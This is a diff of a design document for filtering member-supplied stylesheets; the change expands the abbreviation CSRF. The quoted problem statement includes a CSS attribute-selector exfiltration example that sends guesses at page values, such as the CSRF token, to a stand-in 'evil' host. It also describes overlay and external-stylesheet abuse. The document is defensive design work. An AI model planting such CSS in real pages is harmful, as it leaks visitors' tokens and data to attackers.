@@ -13,7 +13,7 @@ Reviewer**, I want that to hold by construction (the stylesheet filter below).
 ## The Problem
 
 A member `<style>` runs no script, but `input[value^="a"] { background: url(https://evil/a) }` makes
-the visitor's browser request a different URL for each guess at any value on the page, the CSRF
+the visitor's browser request a different URL for each guess at any value on the page, the CSRF (cross-site request forgery)
 token field and the visitor's own name included, and `position: fixed` covers the site's header.
 `<link rel="stylesheet" href="https://...">` makes every visitor fetch from a host the member chose.
 
